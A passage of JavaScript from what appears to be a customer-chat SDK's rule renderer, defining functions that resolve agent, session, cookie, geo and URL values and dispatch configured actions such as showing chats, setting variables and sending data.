      return Math.round(RENDERINGCONTEXT.Date.diff(RenderAbstractDate(dateObj.date1, rule, evt), RenderAbstractDate(dateObj.date2, rule, evt)) / inNum);
    } else {
      return 0;
    }
  };
  addToJssdkRenderer('RenderDateDiff', RenderDateDiff);
  var RenderDefaultAgentGroupId = function (numberObj) {
    return getDefaultAgentGroupId();
  };
  addToJssdkRenderer('RenderDefaultAgentGroupId', RenderDefaultAgentGroupId);
  var RenderDuration = function (obj) {
    return obj.value;
  };
  addToJssdkRenderer('RenderDuration', RenderDuration);
  var RenderLandingCount = function (numberObj) {
    return RENDERINGCONTEXT.PM.getVar(RenderAbstractString(numberObj.counterName), RENDERINGCONTEXT.BRM.rb41(-Math.abs(numberObj.lcHash))).z0();
  };
  addToJssdkRenderer('RenderLandingCount', RenderLandingCount);
  var RenderListSize = function (numberObj) {
    return RenderAbstractList(numberObj.value)["length"];
  };
  addToJssdkRenderer('RenderListSize', RenderListSize);
  var RenderMathOP = function (numberObj) {
    var op = numberObj.op;
    return Math[op].apply(null, RenderAbstractList(numberObj.value));
  };
  addToJssdkRenderer('RenderMathOP', RenderMathOP);
  var RenderNumberGroup = function (numberObj) {
    return numberObj.value;
  };
  addToJssdkRenderer('RenderNumberGroup', RenderNumberGroup);
  var RenderNumberListOp = function (numberObj) {
    return numberObj.value[numberObj.opType]();
  };
  addToJssdkRenderer('RenderNumberListOp', RenderNumberListOp);
  var RenderPageID = function (obj, evt) {
    if (obj.pageNum.idx != null) {
      return RENDERINGCONTEXT.LDM.getPageID(RenderAbstractNumber(obj.pageNum.idx), evt);
    }
    return RENDERINGCONTEXT.LDM.getPageID(null, evt);
  };
  addToJssdkRenderer('RenderPageID', RenderPageID);
  var RenderRandomInt = function (numberObj) {
    return RENDERINGCONTEXT.rand(RenderAbstractNumber(numberObj.min), RenderAbstractNumber(numberObj.max), true);
  };
  addToJssdkRenderer('RenderRandomInt', RenderRandomInt);
  var RenderRandomNumber = function (numberObj) {
    return RENDERINGCONTEXT.rand(RenderAbstractNumber(numberObj.min), RenderAbstractNumber(numberObj.max));
  };
  addToJssdkRenderer('RenderRandomNumber', RenderRandomNumber);
  var RenderRechatInterval = function (numberObj) {
    var multiplier = RenderAbstractString(numberObj.value);
    var days = Inq.rechatInterval;
    if (multiplier == "* 24") {
      days = days * 24;
    } else if (multiplier == "* 24 * 60") {
      days = days * 24 * 60;
    } else if (multiplier == "* 24 * 60 * 60") {
      days = days * 24 * 60 * 60;
    } else if (multiplier == "* 1000 * 60 * 60 * 24") {
      days = days * 1000 * 60 * 60 * 24;
    } else if (multiplier.toUpperCase() == "WEEKS") {
      days = days / 7;
    }
    return days;
  };
  addToJssdkRenderer('RenderRechatInterval', RenderRechatInterval);
  var RenderSaleExpiration = function (numberObj) {
    var multiplier = RenderAbstractString(numberObj.value.inStr);
    var days = numberObj.value.saleExpirationDays;
    if (multiplier == "HOURS") {
      days = days * 24;
    } else if (multiplier == "MINUTES") {
      days = days * 24 * 60;
    } else if (multiplier == "SECONDS") {
      days = days * 24 * 60 * 60;
    } else if (multiplier == "MILLISECONDS") {
      days = days * 1000 * 60 * 60 * 24;
    } else if (multiplier.toUpperCase() == "WEEKS") {
      days = days / 7;
    }
    return days;
  };
  addToJssdkRenderer('RenderSaleExpiration', RenderSaleExpiration);
  var RenderSiteId = function (siteId) {
    return RENDERINGCONTEXT.getSiteID();
  };
  addToJssdkRenderer('RenderSiteId', RenderSiteId);
  var RenderAbstractStringType = function (stringObj, rule, evt) {
    return RenderAbstractString(stringObj.value, rule, evt);
  };
  addToJssdkRenderer('RenderAbstractStringType', RenderAbstractStringType);
  var RenderAbstractString = function (stringObj, rule, evt, extraArgs) {
    if (typeof stringObj === "string" || stringObj == null) {
      return stringObj;
    }
    if (stringObj.type == "AgentName") {
      return RenderAgentName(stringObj);
    } else if (stringObj.type == "AbstractStringType") {
      return RenderAbstractStringType(stringObj, rule, evt, extraArgs);
    } else if (stringObj.type == "AgentAttributes") {
      return RenderAgentAttributes(stringObj);
    } else if (stringObj.type == "AgentId") {
      return RenderAgentId(stringObj);
    } else if (stringObj.type == "AsString") {
      return RenderAsString(stringObj, rule, evt, extraArgs);
    } else if (stringObj.type == "BrowserType") {
      return RenderBrowserType(stringObj);
    } else if (stringObj.type == "BrowserVersion") {
      return RenderBrowserVersion(stringObj);
    } else if (stringObj.type == "Cookie") {
      return RenderCookie(stringObj);
    } else if (stringObj.type == "CurrentPageDomain") {
      return RenderCurrentPageDomain(stringObj);
    } else if (stringObj.type == "CustomerGeoData") {
      return RenderCustomerGeoData(stringObj);
    } else if (stringObj.type == "CurrentPageQueryParam") {
      return RenderCurrentPageQueryParam(stringObj);
    } else if (stringObj.type == "JsVarRef") {
      return RenderJsRefType(stringObj);
    } else if (stringObj.type == "JsVarType") {
      return RenderJsVarType(stringObj);
    } else if (stringObj.type == "PageMarker") {
      return RenderPageMarker(stringObj, rule, evt);
    } else if (stringObj.type == "ReferringDomain") {
      return RenderReferringDomain(stringObj);
    } else if (stringObj.type == "ReferringQueryParam") {
      return RenderReferringQueryParam(stringObj);
    } else if (stringObj.type == "RegexpSearch") {
      return RenderRegexpSearch(stringObj);
    } else if (stringObj.type == "VariableRefType") {
      return RenderVariableRefType(stringObj, rule, evt, extraArgs);
    } else if (stringObj.type == "ChatId") {
      return RenderChatId(stringObj);
    } else if (stringObj.type == "SessionId") {
      return RenderSessionId(stringObj);
    } else if (stringObj.type == "IncrementalityId") {
      return RenderIncrementalityId(stringObj);
    } else if (stringObj.type == "CurrentPageMarker") {
      return RenderCurrentPageMarker(stringObj, rule, evt);
    } else if (stringObj.type == "CustomerId") {
      return RenderCustomerId(stringObj);
    } else if (stringObj.type == "strList") {
      return RenderStringConcat(stringObj, rule, evt, extraArgs);
    } else if (stringObj.type == "ConstantRef") {
      return RenderConstantRef(stringObj, rule, evt, extraArgs);
    } else if (stringObj.type == "CustomerIpAddress") {
      return RenderCustomerIpAddress(stringObj);
    } else if (stringObj.type == "StringReplace") {
      return RenderStringReplace(stringObj, rule, evt, extraArgs);
    } else if (stringObj.type == "VanityDomain") {
      return RenderVanityDomain(stringObj);
    } else if (stringObj.type == "VanityMediaDomain") {
      return RenderVanityMediaDomain(stringObj);
    } else if (stringObj.type == "VanityChatRouterDomain") {
      return RenderVanityChatRouterDomain(stringObj);
    } else if (stringObj.type == "VanityXFormsDomain") {
      return RenderVanityXFormsDomain(stringObj);
    } else if (stringObj.type == "SiteDefaultLanguage") {
      return RenderSiteDefaultLanguage(stringObj);
    } else if (stringObj.type == "OperatingSystemType") {
      return RenderOperatingSystemType(stringObj);
    } else if (stringObj.type == "DeviceType") {
      return RenderDeviceType(stringObj);
    } else if (stringObj.type == "AgentAttributes") {
      return RenderAgentAttributes(stringObj);
    } else if (stringObj.type == "TargetAgentAttributes") {
      return RenderTargetAgentAttributes(stringObj, rule, evt, extraArgs);
    } else if (stringObj.type == "BusinessRuleAttributes") {
      return RenderBusinessRuleAttributes(stringObj, rule, evt, extraArgs);
    } else if (stringObj.type == "EncodeOrDecodeUrl") {
      return RenderEncodeOrDecodeUrl(stringObj);
    } else if (stringObj.type == "PageName") {
      return RenderPageName(stringObj);
    } else if (stringObj.type == "ServerUrl") {
      return RenderServerUrl(stringObj);
    } else if (stringObj.type == "country-code") {
      return RenderCountryCode(stringObj);
    } else if (stringObj.type == "current-page-url") {
      return RenderCurrentPageUrl(stringObj);
    } else if (stringObj.type == "region-code") {
      return RenderRegionCode(stringObj);
    } else if (stringObj.type == "VADataPass") {
      return RenderVADataPass(stringObj);
    } else if (stringObj.type == "ConversationID") {
      return RenderConversationID(stringObj);
    } else if (stringObj.type == "InitialCustomerID") {
      return RenderInitialCustomerID(stringObj);
    } else if (stringObj.type == "LastBusinessUnitIdOfConversation") {
      return RenderLastBusinessUnitIdOfConversation();
    } else if (stringObj.type == "LastAgentGroupIdOfConversation") {
      return RenderLastAgentGroupIdOfConversation();
    } else if (stringObj.type == "EngagementAttribute") {
      return RenderEngagementAttribute(stringObj);
    }
    throw "RenderAbstractString: Unexpected stringObj type: " + stringObj.type;
  };
  addToJssdkRenderer('RenderAbstractString', RenderAbstractString);
  var RenderAgentAttributes = function (stringObj) {
    return RENDERINGCONTEXT.CHM.getChatData() && RENDERINGCONTEXT.CHM.getChatData().getChatData() ? RENDERINGCONTEXT.MI8.JSON.stringify(RENDERINGCONTEXT.CHM.getChatData().getChatData().agtAttrs).replace(/({|,)([^()\":]*):/g, "$1\"$2\":") : null;
  };
  addToJssdkRenderer('RenderAgentAttributes', RenderAgentAttributes);
  var RenderAgentId = function (stringObj) {
    return RENDERINGCONTEXT.CHM.getAgentID();
  };
  addToJssdkRenderer('RenderAgentId', RenderAgentId);
  var RenderAgentName = function (stringObj) {
    return RENDERINGCONTEXT.CHM.getAgentName();
  };
  addToJssdkRenderer('RenderAgentName', RenderAgentName);
  var RenderAsString = function (stringObj, rule, evt, extraArgs) {
    if ("item" in stringObj) {
      var tmp = RenderAbstractItem(stringObj.item, rule, evt, extraArgs);
      return RENDERINGCONTEXT.e9(tmp) ? tmp.toString() : "";
    } else if ("list" in stringObj) {
      var tmp = RenderAbstractList(stringObj.list, rule, evt, extraArgs);
      return RENDERINGCONTEXT.e9(tmp) ? tmp.toString() : "";
    } else {
      return stringObj.value;
    }
  };
  addToJssdkRenderer('RenderAsString', RenderAsString);
  var RenderBrowserType = function (stringObj) {
    return RENDERINGCONTEXT.getClientBrowserType();
  };
  addToJssdkRenderer('RenderBrowserType', RenderBrowserType);
  var RenderBrowserVersion = function (stringObj) {
    return RENDERINGCONTEXT.cbtv1();
  };
  addToJssdkRenderer('RenderBrowserVersion', RenderBrowserVersion);
  var RenderBusinessRuleAttributes = function (stringObj, rule, evt) {
    if (evt == undefined || rule == undefined) {
      throw "RenderBusinessRuleAttributes error: evt or rule is undefined.";
    }
    return RENDERINGCONTEXT.firstExisting('ra1t', RENDERINGCONTEXT.CHM.getChat(), evt && evt.rule, rule) || "";
  };
  addToJssdkRenderer('RenderBusinessRuleAttributes', RenderBusinessRuleAttributes);
  var RenderChatId = function (obj) {
    if (obj.value == 'default') {
      return RENDERINGCONTEXT.CHM.getChatID() ? RENDERINGCONTEXT.CHM.getChatID() : RENDERINGCONTEXT.CHM.getLastChatID() ? RENDERINGCONTEXT.CHM.getLastChatID() : null;
    } else if (obj.value == 'current') {
      return RENDERINGCONTEXT.CHM.getChatID() ? RENDERINGCONTEXT.CHM.getChatID() : null;
    } else if (obj.value == 'last') {
      return RENDERINGCONTEXT.CHM.getLastChatID() ? RENDERINGCONTEXT.CHM.getLastChatID() : null;
    } else {
      return RENDERINGCONTEXT.CHM.getChatID();
    }
  };
  addToJssdkRenderer('RenderChatId', RenderChatId);
  var RenderConversationID = function (stringObj) {
    return RENDERINGCONTEXT.CONVM.getConversationID();
  };
  addToJssdkRenderer('RenderConversationID', RenderConversationID);
  var RenderCookie = function (obj) {
    return RENDERINGCONTEXT.CM._getCookie(RenderAbstractString(obj.value));
  };
  addToJssdkRenderer('RenderCookie', RenderCookie);
  var RenderCountryCode = function (obj) {
    return RENDERINGCONTEXT.FP.getCustGeoData() ? RENDERINGCONTEXT.FP.getCustGeoData().country_code : "";
  };
  addToJssdkRenderer('RenderCountryCode', RenderCountryCode);
  var RenderCurrentPageDomain = function (obj) {
    var url;
    if (v3Lander.isWebSDK) {
      url = window.pageUrl;
    } else {
      url = RENDERINGCONTEXT.win.document.URL;
    }
    return url ? RENDERINGCONTEXT.URI.parseURI(url).domain : "";
  };
  addToJssdkRenderer('RenderCurrentPageDomain', RenderCurrentPageDomain);
  var RenderCurrentPageMarker = function (strObj, rule, evt) {
    if (evt == undefined) {
      throw "RenderCurrentPageMarker error: evt is undefined.";
    }
    return RENDERINGCONTEXT.LDM.getPageMarker(null, evt);
  };
  addToJssdkRenderer('RenderCurrentPageMarker', RenderCurrentPageMarker);
  var RenderCurrentPageQueryParam = function (obj) {
    var URL;
    if (v3Lander.isWebSDK && window.pageUrl) {
      URL = RENDERINGCONTEXT.URI.parseURI(window.pageUrl);
    } else {
      URL = RENDERINGCONTEXT.URI.parseURI(RENDERINGCONTEXT.win.document.URL);
    }
    if (!URL) {
      return "";
    } else if (!obj.defaultStr && !obj.strCont) {
      return RENDERINGCONTEXT.getDefaultValueIfNull(URL.qMap[RenderAbstractString(obj.paramId)], "");
    } else if (obj.defaultStr) {
      return RENDERINGCONTEXT.getDefaultValueIfNull(URL.qMap[RenderAbstractString(obj.paramId)], RenderAbstractString(obj.defaultStr));
    } else if (obj.strCont) {
      return RENDERINGCONTEXT.getDefaultValueIfNull(URL.qMap[RenderAbstractString(obj.paramId)], RenderAbstractString(obj.strCont));
    }
    throw "RenderCurrentPageQueryParam error: object lacks information to render. ";
  };
  addToJssdkRenderer('RenderCurrentPageQueryParam', RenderCurrentPageQueryParam);
  var RenderCurrentPageUrl = function (obj) {
    return RENDERINGCONTEXT.LDM.getCurrentPageURL();
  };
  addToJssdkRenderer('RenderCurrentPageUrl', RenderCurrentPageUrl);
  var RenderCustomerGeoData = function (obj) {
    if (RENDERINGCONTEXT.inu1(RENDERINGCONTEXT.getCustGeoData())) {
      return "";
    }
    if (obj.hasCountryCode) {
      return RENDERINGCONTEXT.getDefaultValueIfNull(RENDERINGCONTEXT.getCustGeoData().country_code, "");
    } else if (obj.hasZipcode) {
      return RENDERINGCONTEXT.getDefaultValueIfNull(RENDERINGCONTEXT.getCustGeoData().zip_code, "");
    } else if (obj.hasRegionCode) {
      return RENDERINGCONTEXT.getDefaultValueIfNull(RENDERINGCONTEXT.getCustGeoData().region_code, "");
    }
    throw "RenderCustomerGeoData error: object lacks information to render: " + obj.toString();
  };
  addToJssdkRenderer('RenderCustomerGeoData', RenderCustomerGeoData);
  var RenderCustomerId = function (strObj) {
    return Inq.getCustID();
  };
  addToJssdkRenderer('RenderCustomerId', RenderCustomerId);
  var RenderCustomerIpAddress = function (numberObj) {
    return Inq.getCustIP();
  };
  addToJssdkRenderer('RenderCustomerIpAddress', RenderCustomerIpAddress);
  var RenderDeviceType = function (stringObj) {
    return RENDERINGCONTEXT.getDeviceType();
  };
  addToJssdkRenderer('RenderDeviceType', RenderDeviceType);
  var RenderEncodeOrDecodeUrl = function (stringObj) {
    if (stringObj.op == "encode") {
      return encodeURIComponent(RenderAbstractString(stringObj.value));
    } else {
      return decodeURIComponent(RenderAbstractString(stringObj.value));
    }
  };
  addToJssdkRenderer('RenderEncodeOrDecodeUrl', RenderEncodeOrDecodeUrl);
  var RenderIncrementalityId = function (strObj) {
    return RENDERINGCONTEXT.asi4();
  };
  addToJssdkRenderer('RenderIncrementalityId', RenderIncrementalityId);
  var RenderInitialCustomerID = function (stringObj) {
    return RENDERINGCONTEXT.CONVM.getInitialCustomerID();
  };
  addToJssdkRenderer('RenderInitialCustomerID', RenderInitialCustomerID);
  var RenderLastAgentGroupIdOfConversation = function () {
    return RENDERINGCONTEXT.CONVM.getLastAgentGroupID();
  };
  addToJssdkRenderer('RenderLastAgentGroupIdOfConversation', RenderLastAgentGroupIdOfConversation);
  var RenderLastBusinessUnitIdOfConversation = function () {
    return RENDERINGCONTEXT.CONVM.getLastBusinessUnitID();
  };
  addToJssdkRenderer('RenderLastBusinessUnitIdOfConversation', RenderLastBusinessUnitIdOfConversation);
  var RenderOperatingSystemType = function (stringObj) {
    return RENDERINGCONTEXT.getOSType();
  };
  addToJssdkRenderer('RenderOperatingSystemType', RenderOperatingSystemType);
  var RenderPageMarker = function (obj, rule, evt) {
    if (evt == undefined) {
      throw "RenderPageMarker error: evt is undefined.";
    }
    if (obj.landingOrder != null) {
      return RENDERINGCONTEXT.LDM.getPageMarker(RenderAbstractNumber(obj.landingOrder, rule, evt), evt);
    }
    return RENDERINGCONTEXT.LDM.getPageMarker(null, evt);
  };
  addToJssdkRenderer('RenderPageMarker', RenderPageMarker);
  var RenderPageName = function (stringObj) {
    return RENDERINGCONTEXT.LDM.getPageMarkerById(RenderAbstractNumber(stringObj.pageId));
  };
  addToJssdkRenderer('RenderPageName', RenderPageName);
  var RenderReferringDomain = function (obj) {
    return RENDERINGCONTEXT.URI.parseURI(RENDERINGCONTEXT.doc.referrer).domain;
  };
  addToJssdkRenderer('RenderReferringDomain', RenderReferringDomain);
  var RenderReferringQueryParam = function (obj) {
    return RENDERINGCONTEXT.URI.parseURI(RENDERINGCONTEXT.doc.referrer).qMap[RenderAbstractString(obj.value)];
  };
  addToJssdkRenderer('RenderReferringQueryParam', RenderReferringQueryParam);
  var RenderRegexpSearch = function (obj) {
    var exepResult = new RegExp(RenderAbstractString(obj.regexp)).exec(RenderAbstractString(obj.str));
    return exepResult == null ? null : exepResult[0];
  };
  addToJssdkRenderer('RenderRegexpSearch', RenderRegexpSearch);
  var RenderRegionCode = function (obj) {
    return RENDERINGCONTEXT.FP.getCustGeoData() ? RENDERINGCONTEXT.FP.getCustGeoData().region_code : "";
  };
  addToJssdkRenderer('RenderRegionCode', RenderRegionCode);
  var RenderServerUrl = function (stringObj) {
    var urls = RENDERINGCONTEXT.urls;
    if (stringObj.value == 'vanity-domain') {
      return urls.vanityURL;
    } else if (stringObj.value == 'chatrouter-domain') {
      return urls.chatRouterVanityDomain;
    } else if (stringObj.value == 'media-domain') {
      return urls.mediaRootURL;
    } else if (stringObj.value == 'xforms-domain') {
      return urls.xFormsDomain;
    } else if (stringObj.value == 'cobrowse-domain') {
      return urls.cobrowseURL;
    } else if (stringObj.value == 'current-page-domain') {
      var url;
      if (v3Lander.isWebSDK) {
        url = window.pageUrl;
      } else {
        url = RENDERINGCONTEXT.win.document.URL;
      }
      return url ? RENDERINGCONTEXT.URI.parseURI(url).domain : "";
    } else if (stringObj.value == 'log-js-url') {
      return urls.logJsURL;
    } else if (stringObj.value == 'log-js-post-url') {
      return urls.logJsURL;
    } else if (stringObj.value == 'log-data-url') {
      return urls.logDataURL;
    } else if (stringObj.value == 'log-data-evt-list-url') {
      return urls.logDataEvtListURL;
    } else if (stringObj.value == 'logging-url') {
      return urls.loggingURL;
    } else if (stringObj.value == 'request-c2c-url') {
      return urls.requestC2CImageURL;
    } else if (stringObj.value == 'request-chat-launch-url') {
      return urls.requestChatLaunchURL;
    } else if (stringObj.value == 'tagserver-incrementality-onevent') {
      return urls.vanityURL + "/tagserver/incrementality/onEvent";
    } else if (stringObj.value == 'set-sale-url') {
      return urls.vanityURL + "/tagserver/sale/setSale";
    } else if (stringObj.value == 'set-assisted-url') {
      return urls.vanityURL + "/tagserver/assisted/setAssisted";
    } else if (stringObj.value == 'resolve-ip-to-host-name-url') {
      return urls.vanityURL + "/tagserver/address/resolveIpToHostName";
    } else if (stringObj.value == 'sale-landing-url') {
      return urls.vanityURL + "/tagserver/sale/saleLanding";
    } else if (stringObj.value == 'agent-availability-url') {
      return urls.agentsAvailabilityCheckURL;
    }
    throw "RenderServerUrl: Unexpected URL type: " + stringObj.value;
  };
  addToJssdkRenderer('RenderServerUrl', RenderServerUrl);
  var RenderSessionId = function (strObj) {
    return RENDERINGCONTEXT.getSessionID();
  };
  addToJssdkRenderer('RenderSessionId', RenderSessionId);
  var RenderSiteDefaultLanguage = function (stringObj) {
    return RENDERINGCONTEXT.getDefaultLanguage();
  };
  addToJssdkRenderer('RenderSiteDefaultLanguage', RenderSiteDefaultLanguage);
  var RenderStringConcat = function (strObj, rule, evt, extraArgs) {
    var resultStr = "";
    for (var i = 0; i < strObj.value.length; i++) {
      resultStr += RenderAbstractString(strObj.value[i], rule, evt, extraArgs);
    }
    return resultStr;
  };
  addToJssdkRenderer('RenderStringConcat', RenderStringConcat);
  var RenderStringReplace = function (stringObj, rule, evt, extraArgs) {
    var regStr = RenderAbstractString(stringObj.reVal, rule, evt, extraArgs);
    var re = new RegExp(regStr, "g");
    return RenderAbstractString(stringObj.inputStr, rule, evt, extraArgs).replace(re, RenderAbstractString(stringObj.replaceWith, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderStringReplace', RenderStringReplace);
  var RenderTargetAgentAttributes = function (stringObj, rule, evt) {
    if (evt == undefined || rule == undefined) {
      throw "RenderTargetAgentAttributes error: evt or rule is undefined.";
    }
    return RENDERINGCONTEXT.firstExisting('getAgentAttributesAsString', RENDERINGCONTEXT.CHM.getChat(), evt && evt.rule, rule);
  };
  addToJssdkRenderer('RenderTargetAgentAttributes', RenderTargetAgentAttributes);
  var RenderVADataPass = function (stringObj) {
    return RENDERINGCONTEXT.CHM.getChatData() && RENDERINGCONTEXT.CHM.getChatData().getVADataPass() ? RENDERINGCONTEXT.CHM.getChatData().getVADataPass() : null;
  };
  addToJssdkRenderer('RenderVADataPass', RenderVADataPass);
  var RenderVanityChatRouterDomain = function (stringObj) {
    return RENDERINGCONTEXT.urls.chatRouterVanityDomain;
  };
  addToJssdkRenderer('RenderVanityChatRouterDomain', RenderVanityChatRouterDomain);
  var RenderVanityDomain = function (stringObj) {
    return stringObj.vanityDomainName;
  };
  addToJssdkRenderer('RenderVanityDomain', RenderVanityDomain);
  var RenderVanityMediaDomain = function (stringObj) {
    return RENDERINGCONTEXT.urls.mediaRootURL;
  };
  addToJssdkRenderer('RenderVanityMediaDomain', RenderVanityMediaDomain);
  var RenderVanityXFormsDomain = function (stringObj) {
    return RENDERINGCONTEXT.urls.xFormsDomain;
  };
  addToJssdkRenderer('RenderVanityXFormsDomain', RenderVanityXFormsDomain);
  var RenderEngagementAttribute = function (obj) {
    return RENDERINGCONTEXT.CHM.getEngagementAttributeValue(RenderAbstractString(obj.value));
  };
  addToJssdkRenderer('RenderEngagementAttribute', RenderEngagementAttribute);
  var RenderAbstractAction = function (actionObj, rule, evt, extraArgs) {
    if (actionObj.type == "ConditionalAction") {
      return RenderConditionalAction(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "SetObjectVar") {
      return RenderSetObjectVar(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "PopoutWindow") {
      return RenderPopoutWindow(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "AssertTrue") {
      return RenderAssertTrue(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "PublishJsApiFunction") {
      return RenderPublishJsApiFunction(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "DebugAlert") {
      return RenderDebugAlert(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "Debugger") {
      return RenderDebugger(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "Log") {
      return RenderLog(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "LogToServer") {
      return RenderLogToServer(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "SetNumberVar") {
      return RenderSetNumberVar(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "ExecuteCustomJs") {
      return RenderExecuteCustomJs(actionObj, rule, evt);
    } else if (actionObj.type == "SetStringVar") {
      return RenderSetStringVar(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "SetBooleanVar") {
      return RenderSetBooleanVar(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "SetDateVar") {
      return RenderSetDateVar(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "SetPriority") {
      return RenderSetPriority(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "LaunchMonitor") {
      return RenderLaunchMonitor(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "ShowProactive") {
      return RenderShowProactive(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "ShowConversive") {
      return RenderShowConversive(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "AddToList") {
      return RenderAddToList(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "ShowC2Call") {
      return RenderShowC2Call(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "ShowExternalChat") {
      return RenderShowExternalChat(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "SendData") {
      return RenderSendData(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "CallRmt") {
      return RenderCallRemote(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "SendDataToAgent") {
      return RenderSendDataToAgent(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "FireCustomEvent") {
      return RenderFireCustomEvent(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "ClearCookie") {
      return RenderClearCookie(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "ResetCookie") {
      return RenderResetCookie(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "ShowSurvey") {
      return RenderShowSurvey(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "UnblockService") {
      return RenderUnblockService(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "BlockService") {
      return RenderBlockService(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "DoActionList") {
      return RenderDoActionList(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "ObjectAccess") {
      return RenderObjectAccess(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "MapEach") {
      return RenderMapEach(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "MapSet") {
      return RenderMapSet(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "MapClear") {
      return RenderMapClear(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "MapUnset") {
      return RenderMapUnset(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "ShowExitConfirmation") {
      return RenderShowExitConfirmation(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "SetExitHook") {
      return RenderSetExitHook(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "VisitorAttributesAction") {
      return RenderVisitorAttributesAction(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "JumpToPage") {
      return RenderJumpToPage(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "DisplayInClientDiv") {
      return RenderDisplayInClientDiv(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "UpdateXframe") {
      return RenderUpdateXframe(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "Display") {
      return RenderDisplay(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "SetPersistentCustomerId") {
      return RenderSetPersistentCustomerId(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "SetAuthenticatedUser") {
      return RenderSetAuthenticatedUser(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "SetUserObject") {
      return RenderSetUserObject(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "JsFunctionResultType") {
      return RenderAbstractItem(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "FetchDataCallType") {
      return RenderDataCallByParams(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "FetchDomDataType") {
      return RenderDomDataCall(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "PostDataCallType") {
      return RenderPostFuncCall(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "C2cSpec") {
      return RenderC2cSpec(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "C2cTheme") {
      return RenderC2cTheme(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "ChatSpec") {
      return RenderChatSpec(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "ChatTheme") {
      return RenderChatTheme(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "ComRemoteType") {
      return RenderComRemoteType(actionObj, rule, evt, extraArgs);
    } else if (actionObj.type == "CurrentVisitorAttributes") {
      return RenderCurrentVisitorAttributes(actionObj);
    } else if (actionObj.type == "SetEngagementAttributes") {
      return RenderSetEngagementAttributes(actionObj, rule, evt, extraArgs);
    }
    throw "RenderAbstractAction: Unexpected action type: " + actionObj.type;
  };
  addToJssdkRenderer('RenderAbstractAction', RenderAbstractAction);
  var RenderAddToList = function (atlObj, rule, evt, extraArgs) {
    var result = {};
    var objArr = [];
    if ("abstractItem" in atlObj) {
      for (var idx = 0; idx < atlObj.abstractItem.length; idx++) {
        objArr.push(RenderAbstractItem(atlObj.abstractItem[idx], rule, evt, extraArgs));
      }
      result.abstractItem = RENDERINGCONTEXT.PM.getVar(RenderAbstractString(atlObj.listVarId, rule, evt, extraArgs), rule).prepend(objArr);
    }
    if ("abstractList" in atlObj) {
      result.abstractList = RENDERINGCONTEXT.PM.getVar(RenderAbstractString(atlObj.listVarId, rule, evt, extraArgs), rule).prepend(RenderAbstractList(atlObj.abstractList, rule, evt, extraArgs));
    }
    return result;
  };
  addToJssdkRenderer('RenderAddToList', RenderAddToList);
  var RenderAssertTrue = function (atObj, rule, evt, extraArgs) {
    return this.assertTrue(function () {
      var rule = arguments.callee.caller.caller.arguments[0];
      return RenderAbstractCondition(atObj.abstractCondition, rule, evt, extraArgs);
    }, RenderAbstractString(atObj.name, rule, evt, extraArgs), RenderAbstractString(atObj.messageOnFail, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderAssertTrue', RenderAssertTrue);
  var RenderBlockService = function (bsObj, rule, evt, extraArgs) {
    var value = ["ALL"];
    if ("services" in bsObj) value = RenderAbstractList(bsObj.services, rule, evt, extraArgs);
    return Inq.blockServices(value, RenderAbstractNumber(bsObj.duration, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderBlockService', RenderBlockService);
  var RenderC2cOrChatModel = function (modelObj, rule, evt, extraArgs) {
    if (modelObj.type == "c2c-spec-model") {
      return RenderC2cSpecModel(modelObj, rule, evt, extraArgs);
    } else if (modelObj.type == "c2c-theme-model") {
      return RenderC2cThemeModel(modelObj, rule, evt, extraArgs);
    } else if (modelObj.type == "chat-spec-model") {
      return RenderChatSpecModel(modelObj, rule, evt, extraArgs);
    } else if (modelObj.type == "chat-theme-model") {
